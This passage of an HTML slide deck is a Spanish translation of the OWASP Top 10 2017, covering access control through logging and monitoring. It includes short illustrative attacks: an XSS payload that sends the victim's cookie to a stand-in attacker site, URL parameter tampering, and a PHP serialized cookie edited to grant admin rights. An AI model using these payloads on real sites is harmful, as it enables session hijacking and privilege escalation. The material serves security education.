+      Las fallas típicamente conducen a la divulgación, modificación o destrucción de información no autorizada de todos los datos, o al realizar una función de negocio fuera de los límites del usuario. 
+      
+      Las vulnerabilidades comunes de control de acceso incluyen:
+      
+      * Pasar por alto las comprobaciones de control de acceso modificando la URL, el estado interno de la aplicación o página HTML, o utilizando una herramienta personalizada de ataques a API.
+      * Permitir que la clave primaria se cambie a la de otro usuario, pudiendo ver o editar la cuenta de otra persona.
+      * Elevación de privilegios. Actuar como un usuario sin iniciar sesión, o actuar como  un administrador cuando inicia sesión como usuario.
+      
+      ---
+      # A5:2017 Pérdida de Control de Acceso
+
+      ## ¿La aplicación es vulnerable?
+      
+      * Manipulación de metadatos, como reproducir o manipular un token de control de acceso JWT (JSON Web Token), una cookie o un campo oculto para elevar los privilegios, o abusar de la invalidación de tokens JWT.
+      * La configuración incorrecta de CORS permite el acceso no autorizado a la API.
+      * Forzar la navegación  a páginas autenticadas como un usuario no autenticado o a páginas privilegiadas como usuario estándar. 
+      * Acceder a API con controles de acceso ausentes para verbos POST, PUT y DELETE.
+      
+      ---
+      # A5:2017 Pérdida de Control de Acceso
+
+      ## Cómo se previene
+      
+      El control de acceso solo es efectivo si es aplicado del lado del servidor o en la API sin servidor, donde el atacante no puede modificar la verificación o los metadatos del control de acceso.
+      
+      * Con la excepción de los recursos públicos, denegar de forma predeterminada.
+      * Implemente los mecanismos de control de acceso una vez y reutilícelo en toda la aplicación, incluyendo minimizar el control de acceso HTTP (CORS).
+      * Los modelos de control de acceso deben imponer la propiedad de los registros, en lugar de aceptar que el usuario puede crear, leer, actualizar o eliminar cualquier registro.
+      * Los modelos de dominio deben hacer cumplir los requisitos exclusivos de los límites de negocio de las aplicaciones.
+
+      ---
+      # A5:2017 Pérdida de Control de Acceso
+
+      ## Cómo se previene
+      
+      * Deshabilitar el listado de directorios del servidor web y asegurar que los metadatos de archivos (por ejemplo de git) y archivos de copia de seguridad no estén presentes en las carpetas web.
+      * Registrar errores de control de acceso, alertar a los administradores cuando corresponda (por ejemplo, fallas reiteradas).
+      * Limite la tasa de acceso a APIs y al control de acceso para minimizar el daño de herramientas de ataque automatizadas.
+      * Los tokens JWT deben ser invalidados luego de la finalización de la sesión por parte del usuario.
+      * Los desarrolladores y el personal de control de calidad deben incluir pruebas de control de acceso en sus pruebas unitarias y de integración.
+      
+      ---
+      # A5:2017 Pérdida de Control de Acceso
+
+      ## Ejemplos de escenarios de ataque
+      
+      **Escenario #1**:  
+      - La aplicación utiliza datos no validados en una llamada SQL que accede a información de cuenta:
+      
+      ```
+        pstmt.setString(1, request.getParameter("acct"));
+        ResultSet results = pstmt.executeQuery();
+      ```
+      
+      - Un atacante simplemente modificando el parámetro 'acct' en el navegador para enviar el número de cuenta que desee. 
+      - Si no se verifica correctamente, el atacante puede acceder a la cuenta de cualquier usuario.
+      
+      `http://example.com/app/accountInfo?acct=notmyacct`
+      
+      ---
+      # A5:2017 Pérdida de Control de Acceso
+
+      ## Ejemplos de escenarios de ataque
+      
+      **Escenario #2**: 
+      - Un atacante simplemente fuerza las búsquedas a las URL de destino. 
+      - Los privilegios de administrador son necesarios para acceder a la página de administración.
+      
+      ```
+        http://example.com/app/getappInfo
+        http://example.com/app/admin_getappInfo
+      ```
+      
+      - Si un usuario no autenticado puede acceder a cualquiera de las páginas, es un error. 
+      - Si un usuario no administrador puede acceder a la página de administración, esto es una falla.
+      
+      ---
+      # A6:2017 Configuración de Seguridad Incorrecta
+
+      ## Agentes de amenaza/Vectores de ataque 
+      - Los atacantes a menudo intentarán explotar defectos sin parchear o acceder a cuentas predeterminadas, páginas no utilizadas, archivos y directorios desprotegidos, etc. para obtener acceso o conocimiento no autorizado del sistema. 
+
+      ## Debilidades de seguridad 
+      - Configuraciones incorrectas de seguridad puede nocurrir en cualquier nivel del stack tecnológico, incluidos los servicios de red, la plataforma, el servidor web, el servidor de aplicaciones, la base de datos, frameworks, el código personalizado y máquinas virtuales preinstaladas, contenedores o almacenamiento. 
+      - Los escáneres automatizados son útiles para detectar configuraciones erróneas, el uso de cuentas o configuraciones predeterminadas, servicios innecesarios, opciones heredadas, etc.
+
+      ---
+      # A6:2017 Configuración de Seguridad Incorrecta
+
+      ## Impactos 
+      - Tales defectos frecuentemente dan a los atacantes acceso no autorizado a algunos datos o funciones del sistema. 
+      - Ocasionalmente, tales defectos resultan en un completo compromiso del sistema. 
+      - El impacto de negocio depende de las necesidades de protección de la aplicación y los datos.
+      
+      ---
+      # A6:2017 Configuración de Seguridad Incorrecta
+
+      ## ¿La aplicación es vulnerable?
+      
+      La aplicación puede ser vulnerable si:
+      
+      * Falta de hardening adecuado en cualquier parte del stack tecnológico, o permisos mal configurados en los servicios de la nube.
+      * Se encuentran instaladas o habilitadas característica innecesarias (ej. puertos, servicios, páginas, cuentas o permisos)
+      * Las cuentas predeterminadas y sus contraseñas siguen activas y sin cambios.
+      * El manejo de errores revela trazas de la aplicación u otros mensajes de error demasiado informativos a los usuarios
+      * Para los sistemas actualizados, las nuevas funciones de seguridad se encuentran desactivadas o no se encuentran configuradas de forma segura.
+      
+      ---
+      # A6:2017 Configuración de Seguridad Incorrecta
+
+      ## ¿La aplicación es vulnerable?
+      
+      * Las configuraciones de seguridad en el servidor de aplicaciones, en el framework de aplicación (ej., Struts, Spring, ASP.NET), bibliotecas, bases de datos no se encuentran especificados en valores seguros.
+      * El servidor no envía directrices o cabezales de seguridad a los clientes o no se encuentran configurados con valores seguros
+      * El software se encuentra desactualizado o posee vulnerabilidades (ver A9: 2017 Uso de componentes con vulnerabilidades conocidas)
+      
+      Sin un proceso de configuración de seguridad de aplicación concertado y repetible, los sistemas corren un mayor riesgo.
+      
+      ---
+      # A6:2017 Configuración de Seguridad Incorrecta
+
+      ## Cómo se previene
+      
+      Deben implementarse procesos seguros de instalación, incluyendo:
+      
+      * Un proceso de fortalecimiento reproducible que agilite y facilite la implementación de otro entorno que esté asegurado de manera apropiada. 
+      * Los entornos de desarrollo, de control de calidad (QA)  y de Producción deben configurarse de manera idéntica (con diferentes credenciales utilizadas en cada entorno). 
+      * Este proceso puede automatizarse para minimizar el esfuerzo requerido para configurar un nuevo entorno seguro.
+      * Una plataforma minimalista sin funcionalidades innecesarias, componentes, documentación o ejemplos. Elimine o no instale frameworks y funcionalidades no utilizadas.
+      
+      ---
+      # A6:2017 Configuración de Seguridad Incorrecta
+
+      ## Cómo se previene
+      
+      * Un proceso para revisar y actualizar las configuraciones apropiadas para todas las advertencias de seguridad, actualizaciones y parches como parte del proceso de gestión de parches (ver **A9:2017-Uso de Componentes con vulnerabilidades conocidas**). 
+      * En particular, revise los permisos de almacenamiento en la nube (por ejemplo, los permisos de buckets de S3).
+      * Una arquitectura de la aplicación segmentada que proporcione una separación efectiva y segura entre componentes o arrendatarios, utilizando segmentación, contenedorización o grupos de seguridad en la nube (ACL).
+      * Enviando directivas de seguridad a clientes, p. ej.[Cabezales de seguridad](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project).
+      * Un proceso automatizado para verificar la efectividad de los ajustes y configuraciones en todos los ambientes.
+      
+      ---
+      # A6:2017 Configuración de Seguridad Incorrecta
+
+      ## Ejemplos de escenarios de ataque
+      
+      **Escenario #1**: 
+      - El servidor de aplicaciones viene con aplicaciones de ejemplo que no se eliminan del servidor de producción. 
+      - Estas aplicaciones  poseen defectos de seguridad conocidos que los atacantes usan para comprometer el servidor. 
+      - Si una de estas aplicaciones es la consola de administración, y las cuentas predeterminadas no se han cambiado, el atacante inicia sesión con contraseñas predeterminadas tomando control del mismo.
+      
+      **Escenario #2**: 
+      - El listado de directorios se encuentra activado en el servidor. 
+      - Un atacante descubre que puede listar los archivos. 
+      - El atacante encuentra y descarga las clases de Java compiladas, las descompila y realiza ingeniería inversa para ver el código. 
+      - Encuentra un grave defecto en el control de acceso de la aplicación.
+
+      ---
+      # A6:2017 Configuración de Seguridad Incorrecta
+
+      ## Ejemplos de escenarios de ataque
+
+      **Escenario #3**: 
+      - La configuración del servidor de aplicaciones permite retornar mensajes de error detallados a los usuarios, por ejemplo, las trazas de pila. 
+      - Esto expone potencialmente información sensible o fallas subyacentes tales como versiones de componentes que se sabe que son vulnerables.
+      
+      **Escenario #4**: 
+      - Un proveedor de servicios en la nube (CSP) por defecto permite a otros usuarios del CSP acceder a sus archivos desde internet. 
+      - Esto permite el acceso a datos sensibles almacenados en la nube.
+      
+      ---
+      # A7:2017 Secuencia de Comandos en Sitios Cruzados (XSS)
+
+      ## Agentes de amenaza/Vectores de ataque 
+      - Existen herramientas automatizadas pueden detectar y explotar las tres formas de XSS, y también se encuentran disponibles kits de explotación gratuitos.
+      
+      ## Debilidades de seguridad 
+      - XSS es la segunda vulnerablidad más frecuente en OWASP Top 10, y se encuentra en alrededor de dos tercios de todas las aplicaciones. 
+      - Las herramientas automatizadas pueden detectar algunos problemas XSS en forma automática, particularmente en tecnologías maduras como PHP, J2EE / JSP, y ASP.NET.
+
+      ---
+      # A7:2017 Secuencia de Comandos en Sitios Cruzados (XSS)
+
+      ## Impactos 
+      - El impacto de XSS es moderado para el caso de XSS Reflejado y XSS en DOM, y severa para XSS Almacenado, que permite ejecutar secuencias de comandos en el navegador de la víctima, para robar credenciales, secuestrar sesiones, o la instlación de software malicioso en el equipo de la víctima. 
+
+      ---
+      # A7:2017 Secuencia de Comandos en Sitios Cruzados (XSS)
+
+      ## ¿La aplicación es vulnerable?
+      
+      Existen tres formas usuales de XSS para atacar a los navegadores de los usuarios:
+      
+      **XSS Reflejado**: 
+      - La aplicación o API utiliza datos suministrados por un usuario sin ser validados o codificados apropiadamente como parte del HTML de salida o cuando no existe un cabezal que establezca la política de seguridad de contenido ([CSP](https://www.owasp.org/index.php/Content_Security_Policy)). 
+      - Un ataque exitoso puede permitir al atacante ejecutar comandos arbitrarios HTML y Javascript en el navegador de la víctima. 
+      - Típicamente el usuario deberá interactuar con un enlace, o alguna otra página controlada por el atacante, como un ataque del tipo pozo de agua, publicidad maliciosa, o similar.
+      
+      ---
+      # A7:2017 Secuencia de Comandos en Sitios Cruzados (XSS)
+
+      ## ¿La aplicación es vulnerable?
+
+      **XSS Almacenado**: 
+      - La aplicación o API almacena datos proporcionados por el usuario sin validar ni sanear, la que posteriormente es entregada a otro usuario o un administrador. 
+      - XSS Almacenado es usualmente considerado como de riesgo de nivel alto o crítico.
+      
+      **XSS Basados en DOM**: 
+      - Frameworks en JavaScript, aplicaciones de página única o APIs que dinámicamente incluyen datos controlables por un atacante son vulnerables al DOM XSS. 
+      - Idealmente, se debe evitar enviar datos controlables por el atacante a APIs no seguras.
+      
+      ---
+      # A7:2017 Secuencia de Comandos en Sitios Cruzados (XSS)
+
+      ## ¿La aplicación es vulnerable?
+
+      Típicamente los ataques XSS incluyen el robo de la sesión, apropiación de la cuenta, evasión de autentificación de múltiples pasos, reemplazo de DIV o degradación (como troyanos de autentificación), ataques contra el navegador del usuario como la descarga de software malicioso, grabadores de tecleo, y otros tipos de ataques al lado cliente.
+      
+      ---
+      # A7:2017 Secuencia de Comandos en Sitios Cruzados (XSS)
+
+      ## ¿Como prevenirlo?
+      
+      Prevenir XSS requiere mantener los datos no confiables separados del contenido activo del navegador.
+      
+      * Utilizar marcos de trabajo seguros que por diseño automáticamente codifiquen el contenido para prevevenir XSS, como en Ruby 3.0 o React JS.
+      * Codificar datos de requerimientos HTTP no confiables en el contexto de la salida de HTML (cuerpo, atributos, JavaScript, CSS, o URL) resolverán las vulnerabilidades del tipo XSS Reflejado y XSS Almacenado. 
+      La hoja de trucos [OWASP XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) tiene detalles de las técnicas de codificación de datos requeridas.
+      * Aplicar codificación sensitiva al contexto cuando se modifica el documento en el navegador en el lado cliente, ayuda a prevevenir DOM XSS. 
+      
+      ---
+      # A7:2017 Secuencia de Comandos en Sitios Cruzados (XSS)
+
+      ## ¿Como prevenirlo?
+      
+      * Cuando esta técnica no se puede aplicar, técnicas similares de codificación sensitiva se pueden aplicar a las APIs del navegador, como se explica en la hoja de trucos [OWASP DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
+      * Habilitar una Política de Seguridad de Contenido [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) es una defensa profunda para la mitigación de vulnerabilidades XSS, asumiendo que no hay otras vulnerabilidades que permitan colocar código malicioso vía inclusión de archivos locales como sobreescritura de caminos (path traversal overwrite), o bibliotecas vulnerables de fuentes conocidas, como redes de distribución de contenidos (CDN) o bibliotecas locales.
+      
+      ---
+      # A7:2017 Secuencia de Comandos en Sitios Cruzados (XSS)
+
+      ## Ejemplos de escenarios de ataques
+      
+      **Escenario #1**: 
+      - La aplicación utiliza datos no confiables en la construcción del siguiente código HTML sin validarlos o codificarlos:
+      
+      ```
+         (String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
+      ```
+      - El atacante modifica el parámetro “CC” en el navegador a:
+      
+      ```
+      ><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.
+      ```
+      - Este ataque causa que el identificador de sesión de la víctima sea enviado al sitio web del atacante, permitiendo al atacante secuestrar la sesión actual del usuario.
+      
+      > Atacantes pueden también utilizar XSS para anular cualquier defensa contra Falsificación de Peticiones en Sitios Cruzados (CSRF) que la aplicación pueda utilizar.
+      
+      ---
+      # A8:2017 Deserialización Insegura
+
+      ## Agentes de Amenazas/Vectores de Ataque 
+      - La explotación de la deserialización es algo difícil, ya que los exploits cómo son distribuidos raramente funcionan sin cambios o ajustes en el código de exploit subyacente.
+
+      ## Debilidad de Seguridad 
+      - Este ítem se incluye en el Top 10 basado en una [encuesta de la industria](https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html) y no en datos cuantificables. 
+      - Algunas herramientas pueden descubrir defectos de deserialización, pero con frecuencia se necesita ayuda humana para validar el problema. 
+      - Se espera que los datos de prevalencia de las deficiencias en la deserialización aumenten a medida que se desarrollen las herramientas para ayudar a identificarlas y abordarlas.
+
+      ---
+      # A8:2017 Deserialización Insegura
+
+      ## Impactos 
+      - No se puede exagerar el impacto de los defectos de deserialización. 
+      - Estos defectos pueden llevar a la ejecución remota de código, uno de los ataques más serios posibles. 
+      - El impacto al negocio depende de las necesidades de protección de la aplicación y los datos.
+      
+      ---
+      # A8:2017 Deserialización Insegura
+
+      ## ¿La aplicación es vulnerable?
+      
+      Aplicaciones y APIs serán vulnerables si deserializan objetos hostiles o manipulados por un atacante.
+      
+      Esto da como resultado dos tipos primarios de ataques:
+      
+      * __Ataques relacionados con la estructura de datos y objetos__ donde el atacante modifica la lógica de la aplicación o logra una ejecución remota de código si existen clases disponibles para la aplicación que pueden cambiar el comportamiento durante o después de la deserialización.
+      * __Ataques típicos de manipulación de datos__, como ataques relacionados con el control de acceso en los que se utilizan estructuras de datos existentes pero se modifica su contenido.
+      
+      ---
+      # A8:2017 Deserialización Insegura
+
+      ## ¿La aplicación es vulnerable?
+      
+      Serialización puede ser utilizada en aplicaciones para:
+      
+      * Comunicación remota e inter-procesos (RPC/IPC
+      * Protocolo de comunicaciones, Web Services y Brokers de mensajes
+      * Caching/Persistencia
+      * Bases de datos, servidores de cache y sistemas de archivos
+      
+      ---
+      # A8:2017 Deserialización Insegura
+
+      ## ¿Como prevenirlo?
+      
+      El único patron de arquitectura seguro es no aceptar objetos serializados de fuentes no confiables o utilizar medios de serialización que sólo permitan tipos de datos primitivos.
+      
+      Si esto no es posible, considere uno o mas de los siguientes puntos:
+      
+      * Implementar verificaciones de integridad tales como firmas digitales en cualquier objeto serializado con el fin de detectar modificaciones no autorizadas.
+      * Cumplimiento estricto de verificaciones de tipo de dato durante la deserialización y antes de la creación del objeto, ya que el código normalmente espera un conjunto de clases definibles. 
+      * Se ha demostrado que se puede pasar por alto esta técnica, por lo que no es aconsejable confiar únicamente en ella.
+      * Aislar el código que realiza la deserialización, de modo que ejecute en un entorno con los mínimos privilegios posibles.
+      
+      ---
+      # A8:2017 Deserialización Insegura
+
+      ## ¿Como prevenirlo?
+      
+      * Registrar excepciones y fallas en la deserialización, tales como cuando el tipo recibido no es el tipo esperado, o la deserialización lanza excepciones.
+      * Restringir o monitorear las conexiones de red entrantes y salientes desde contenedores o servidores que utilizan funcionalidades de deserialización.
+      * Monitorear deserialización, alertando si un usuario deserializa constantemente.
+      
+      ---
+      # A8:2017 Deserialización Insegura
+
+      ## Ejemplos de Escenarios de Ataque
+      
+      **Escenario #1**: 
+      - Una aplicación React invoca a un conjunto de microservicios Spring Boot. Siendo programadores funcionales, intentaron asegurar que su código sea inmutable. 
+      - La solución a la que llegaron es serializar el estado del usuario y pasarlo en ambos sentidos con cada solicitud. Un atacante advierte la firma "R00" del objeto Java, y usa la herramienta Java Serial Killer para obtener ejecución de código remoto en el servidor de la aplicación.
+      
+      ---
+      # A8:2017 Deserialización Insegura
+
+      ## Ejemplos de Escenarios de Ataque
+      
+      **Escenario #2**: 
+      - Un foro PHP utiliza serialización de objetos PHP para almacenar una "super" cookie, conteniendo el ID, rol, hash de la contraseña y otros estados del usuario:
+      
+      ```code
+      a:4:{
+        i:0;i:132;i:1;s:7:"Mallory";
+        i:2;s:4:"user";i:3;
+        s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";
+      }```
+      
+      - Un atacante modifica el objeto serializado para darse a si mismo los privilegios de administrador:
+      
+      ```code
+      a:4:{
+        i:0;i:1;i:1;s:5:"Alice";
+        i:2;s:5:"admin";i:3;
+        s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";
+      }```
+      
+      ---
+      # A9:2017 Uso de Componentes con Vulnerabilidades Conocidas
+
+      ## Agentes de Amenazas/Vectores de Ataque 
+      - Mientras que es sencillo de obtener exploits para vulnerabilidades ya conocidas, otras requieren un esfuerzo considerable para desarrollar un exploit personalizado. 
+
+      ## Debilidades de Seguridad 
+      - La prevalencia de estos defectos es muy difundida. 
+      - El desarrollo basado fuertemente en componentes puede llevar al equipo de desarrollo a ni siquiera entender cuales componentes se utilizan en la aplicación o API, mucho menos a mantenerlos actualizados. 
+      - Esta debilidad es detectable mediante el uso de analizadores tales como retire.js o inspección de cabezales. 
+      - La verificación de si es posible su explotación requiere de la descripción del posible ataque.
+
+      ---
+      # A9:2017 Uso de Componentes con Vulnerabilidades Conocidas
+
+      ## Impactos  
+      - Mientras que ciertas vulnerabilidades conocidas conllevan impactos menores, algunas de las mayores brechas registradas hasta la fecha han sido realizadas explotando vulnerabilidades conocidas en componentes. 
+      - Dependiendo de activo que se está protegiendo, este riesgo puede ser incluso el principal de la lista.
+
+      ---
+      # A9:2017 Uso de Componentes con Vulnerabilidades Conocidas
+      
+      ## ¿La aplicación es vulnerable?
+      
+      Es potencialmente vulnerable si:
+      
+      * No conoce las versiones de todos los componentes que utiliza (tanto del lado del cliente como del servidor). 
+      * Esto incluye componentes utilizados directamente como sus dependencias anidadas.
+      * Su software es vulnerable, no posee soporte o se encuentra desactualizado.
+      * Esto incluye el Sistema Operativo, Servidor Web o de Aplicaciones, DBMS, aplicaciones, APIS y todos los componentes, ambientes de ejecución y bibliotecas.
+      * No analiza los componentes periódicamente y se suscribe a los boletines de seguridad de los componentes que utiliza.
+
+      ---
+      # A9:2017 Uso de Componentes con Vulnerabilidades Conocidas
+      
+      ## ¿La aplicación es vulnerable?
+
+      * No parchea o actualiza la plataforma subyacente, frameworks y dependencias en con un enfoque basado en riesgos. 
+      * Esto sucede comunmente en ambientes en las cuales la aplicación de parches se realiza de forma mensual o trimestral bajo control de cambios, lo que deja a la organización abierta a varios días o meses de exposición innecesaria a vulnerabilidades ya solucionadas.
+      * No asegura la configuración de los componentes correctamente (vea A6:2017-Configuración de Seguridad Incorrecta).
+      
+      ---
+      # A9:2017 Uso de Componentes con Vulnerabilidades Conocidas
+
+      ## ¿Como prevenirlo?
+      
+      Debe de existir un proceso de gestión de parches para:
+      
+      * Remover dependencias, funcionalidades, componentes, archivos y documentación innecesaria y no utilizada.
+      * Utilizar una herramienta para mantener un inventario contínuo de las versiones de los componentes (por ejemplo frameworks o bibliotecas) tanto en el cliente como en el servidor tales como versions, DependencyCheck, retire.js, etc.
+      * Monitorizar continuamente fuentes como CVE y NVD en búsqueda de vulnerabilidades en los componentes utilizados. 
+      * Utilizar herramientas de análisis para automatizar el proceso. Suscribirse a alertas por email de alertas de seguridad en los componentes utilizados.
+
+      ---
+      # A9:2017 Uso de Componentes con Vulnerabilidades Conocidas
+
+      ## ¿Como prevenirlo?
+
+      * Obtener componentes únicamente de orígenes oficiales utilizando canales seguros.Utilizar preferentemente paquete firmados con el fin de reducir las probabilidades de uso de versiones manipiladas maliciosamente.
+      * Monitorizar en búsqueda de bibliotecas y componentes que no poseen mantenimiento o no liberan parches de seguridad para sus versiones obsoletas o sin soporte. Si el parcheo no es posible, considere desplegar un parche virtual para monitorizar, detectar o protegerse contra la debilidad detectada.
+      
+      Cada organización debe asegurar la existencia de un plan en ejecución para monitorizar, evaluar amenazas y aplicar actualizaciones o cambios de configuraciones durante el ciclo de vida de las aplicaciones o su documentación.
+      
+      ---
+      # A9:2017 Uso de Componentes con Vulnerabilidades Conocidas
+
+      ## Ejemplo de Escenarios de Ataque 
+      
+      **Escenario #1**: 
+      - Típicamente, los componentes ejecutan con los mismos privilegios de la aplicación que los contienen y, como consecuencia, fallas en éstos pueden resultar en impactos serios. 
+      - Estas fallas pueden ser accidentales (errores de codificación, por ejemplo) o intencionales ( una puerta trasera en un componente, por ejemplo). 
+      - Algunos ejemplos de vulnerabilidades en componentes explotables son:
+      
+       * [CVE-2017-5638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638), una ejecución remota de código en Struts 2 que ha sido culpada de grandes brechas de datos.
+       * Aunque los dispositivos del [internet de las cosas (IoT)](https://en.wikipedia.org/wiki/Internet_of_things) frecuentemente son imposibles o muy dificultosos de ser actualizados, la importancia de éstas actualizaciones puede ser enorme ( por ejemplo dispositivos biomedicos).
+      
+      ---
+      # A9:2017 Uso de Componentes con Vulnerabilidades Conocidas
+
+      ## Ejemplo de Escenarios de Ataque 
+      
+      - Existen herramientas automáticas que ayudan a los atacantes a descubrir sistemas mal configurados o desactualizados. 
+      - A modo de ejemplo, el [motor de búsqueda Shodan IoT](https://www.shodan.io/report/89bnfUyJ) ayuda a descubrir dispositivos que aún son vulnerables a [Heartbleed](https://en.wikipedia.org/wiki/Heartbleed), la cual fue parcheada en abril del 2014.
+      
+      ---
+      # A10:2017 Registro y Monitoreo Insuficientes
+
+      ## Agentes de Amenazas/Vectores de Ataque 
+      - El registro y monitoreo insuficientes es la base de casi todos los mayores incidentes. 
+      - Los atacantes dependen de la falta de monitoreo y respuesta oportuna para lograr sus objetivos sin ser detectados.
+      
+      ## Debilidades de Seguridad 
+      - Este punto se incluye en el Top 10 basado en una [encuesta a la industria](https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html). 
+      - Una estrategia para determinar si usted no posee suficiente monitoreo es examinar los registros después de las pruebas de penetración. 
+      - Las acciones de los evaluadores deben registrarse suficientemente para comprender los daños que pueden haber causado. 
+      
+      ---
+      # A10:2017 Registro y Monitoreo Insuficientes
+
+      ## Impactos 
+      - Los ataques más exitosos comienzan con la exploración de vulnerabilidades. 
+      - Permitir que el sondeo de vulnerabilidades continúe puede aumentar la probabilidad de una explotación exitosa a casi el 100%. 
+      - En 2016, la identificación de una brecha tardó una [media de 191 días](https://www-01.ibm.com/common/ssi/cgi-bin/ssialias?htmlfid=SEL03130WWEN&) - este tiempo es mas que suficiente para infligir daño. 
+      
+      ---
+      # A10:2017 Registro y Monitoreo Insuficientes
+
+      ## ¿La aplicación es vulnerable?
+      
+      Registro y monitoreo insuficientes ocurre en cualquier instante:
+      
+      * Eventos auditables, tales como los inicios de sesión, fallos en el inicio de sesión, y transacciones de alto valor no son registrados.
+      * Advertencias y errores generan registros poco claros, inadecuados o ninguno en absoluto.
+      * Registros en aplicaciones o APIs no son monitoreados por actividad sospechosa.
+      * Registros son almacenados únicamente de forma local.
+      * Los umbrales de alerta y de escalamiento de respuesta no están implementados o no son eficaces.
+      * Pruebas de penetración y escaneos utilizando herramientas [DAST](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools) (tales como [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)) no generan alertas.
+      
+      ---
+      # A10:2017 Registro y Monitoreo Insuficientes
+
+      ## ¿La aplicación es vulnerable?
+      
+      * La aplicación no logra detectar, escalar o alertar sobre ataques en tiempo real o cerca de estar en tiempo real.
+      
+      También es vulnerable a la fuga de información si registra y alerta eventos visibles para un usuario o un atacante (consulte A3:2017 Exposición sensible a la información).
+      
+      ---
+      # A10:2017 Registro y Monitoreo Insuficientes
+
+      ## ¿Como prevenirlo?
+      
+      Según el riesgo de los datos almacenados o procesados por la aplicación:
+      
+      * Asegúrese de que todos los errores de inicio de sesión, de control de acceso y de validación de entradas de dato del lado del servidor se pueden registrar con el contexto de usuario suficiente para identificar cuentas sospechosas o maliciosas, y mantenerlo durante el tiempo suficiente para permitir un eventual análisis forense.
+      * Asegúrese de que las transacciones de alto impacto tengan una pista de auditoría con controles de integridad para prevenir alteraciones o eliminaciones, tales como añadir únicamente tablas de bases de datos o similares.
+      * Asegúrese que todas las transacciones de alto valor poseen una traza de auditoría con controles de integridad que permitan detectar su modificación o borrado, tales como una base de datos con permisos únicamente de inserción u otro.
+      
+      ---
+      # A10:2017 Registro y Monitoreo Insuficientes
+
+      ## ¿Como prevenirlo?
+      
+      * Establezca una monitorización y alerta efectivos de tal manera que las actividades sospechosas sean detectadas y respondidas dentro de periodos de tiempo aceptables.
+      * Establezca o adopte un plan de respuesta o recuperación de incidentes, tales como [NIST 800-61 rev 2](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final) o posterior.
+      
+      Existen frameworks de protección de aplicaciones comerciales y de código abierto tales como [OWASP AppSensor](https://www.owasp.org/index.php/OWASP_AppSensor_Project), firewalls de aplicaciones web como [ModSecurity utilizando el Core Rule Set de OWASP](https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project), y software de correlación de registros con paneles personalizados y alertas.
+
+      ---
+      # A10:2017 Registro y Monitoreo Insuficientes
+
+      ## Ejemplo de Escenarios de Ataque
+      
+      **Escenario #1**: 
+      - El software de un foro de código abierto es operado por un pequeño equipo que fue hackeado utilizando una falla de seguridad en su software. 
+      - Los atacantes lograron eliminar el repositorio del código fuente interno que contiene la próxima versión, y todos los contenidos del foro. 
+      - Aunque el código fuente pueda ser recuperado, la falta de monitorización, registro y alerta condujo a una brecha de seguridad aún peor. 
+      - El proyecto de software de éste foro ya no está activo debido a éste problema.
+      
+      ---
+      # A10:2017 Registro y Monitoreo Insuficientes
+
+      ## Ejemplo de Escenarios de Ataque
+      
+      **Escenario #2**: 
+      - Un atacante escanea usuarios utilizando la contraseña por defecto, pudiendo tomar el control de todas las cuentas utilizando ésta contraseña. 
+      - Para todos los demás usuarios, éste proceso deja únicamente 1 solo registro de fallo de inicio de sesión. 
+      - Luego de algunos días, esto puede repetirse con una contraseña distinta.
+      
+      ---
+      # A10:2017 Registro y Monitoreo Insuficientes
+
+      ## Ejemplo de Escenarios de Ataque
+      
+      **Escenario #3**: 
+      - De acuerdo a reportes, un importante minorista de los Estados Unidos tenía un sandbox de análisis de malware interno para el análisis de archivos adjuntos de correos electrónicos. 
+      - El sandbox había detectado software potencialmente indeseable, pero nadie respondió a esta detección. 
+      - El sandbox había estado generando advertencias por algún tiempo antes de que la brecha de seguridad fuera detectada debido a transacciones de tarjeta fraudulentas por un banco externo.
+      
+      ---
+      # Referencias
+
+      ## OWASP
+      - [OWASP Top 10](https://www.owasp.org/index.php/Top10)
+      - [Hojas de ayuda de OWASP](https://www.owasp.org/index.php/)      
+      - [Metodología de evaluación de riesgos de OWASP](https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology)
+      - [Artículo sobre modelado de amenaza/riesgo](https://www.owasp.org/index.php/Threat_Risk_Modeling)
+      - [Guía de desarrollado de OWASP](https://www.owasp.org/index.php/OWASP_Guide_Project)
+      - [Guía de pruebas de OWASP](https://www.owasp.org/index.php/OWASP_Testing_Project)
+      - [Controles Proactivos de OWASP](https://www.owasp.org/index.php/OWASP_Proactive_Controls)
+      - [OWASP Modelo de Madurez de Aseguramiento del Software](https://www.owasp.org/index.php/OWASP_SAMM_Project)
+      
+      ---
+      # Referencias
+
+      ## Externas
+      
+      - [ISO 31000: Risk Management Std](https://www.iso.org/iso-31000-risk-management.html)
+      - [ISO 27001: ISMS](https://www.iso.org/isoiec-27001-information-security.html)
+      - [NIST Cyber Framework (US)](https://www.nist.gov/cyberframework)
+      - [ASD Strategic Mitigations (AU)](https://www.asd.gov.au/infosec/mitigationstrategies.htm)
+      - [NIST CVSS 3.0](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
+      - [Herramienta de modelado de riesgos de Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=49168)
+
+    </textarea>
+    <script src="scripts/remark.js"></script>
+    <script>
+       var slideshow = remark.create();
+    </script>
+  </body>
+</html>
